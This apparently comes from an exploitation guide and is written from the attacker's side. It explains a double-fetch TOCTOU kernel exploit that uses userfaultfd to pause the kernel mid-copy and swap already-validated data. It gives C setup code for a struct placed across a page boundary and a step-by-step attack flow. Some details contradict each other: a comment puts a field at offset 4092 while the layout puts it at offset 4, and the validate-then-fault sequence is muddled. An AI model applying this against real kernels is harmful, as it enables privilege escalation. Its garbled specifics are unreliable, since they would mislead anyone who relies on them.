**Double-Fetch TOCTOU Kernel Exploit:**

The vulnerability: kernel reads user-space data twice — once for validation, once for use. Between these reads, we swap the data.

**Winning the race with userfaultfd:**
Userfaultfd lets us pause kernel execution exactly when it page-faults on our controlled memory.

```c
// Setup: mmap two pages, register userfaultfd on second page
struct evil_struct {
    uint32_t cmd;      // offset 0, page 1 (validated)
    uint32_t target;   // offset 4092, page boundary!
    // When kernel reads target, it page-faults into page 2
};

// Place struct so 'target' field spans page boundary
void *mem = mmap(NULL, 2*PAGE_SIZE, PROT_READ|PROT_WRITE,
    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
struct evil_struct *s = (void*)((char*)mem + PAGE_SIZE - 4);

// Register userfaultfd on second page
struct uffdio_register reg = {
    .range = {.start = (long)(mem + PAGE_SIZE), .len = PAGE_SIZE},
    .mode = UFFDIO_REGISTER_MODE_MISSING
};
```

Flow:
1. ioctl() sends our struct to kernel
2. Kernel copy_from_user reads cmd field (page 1) — validates OK
3. Kernel accesses target field — page fault on page 2!
4. Userfaultfd handler fires in our userspace thread
5. We modify the validated fields in page 1 (the kernel hasn't locked them)
6. Handler resolves the fault, kernel continues with our MODIFIED data

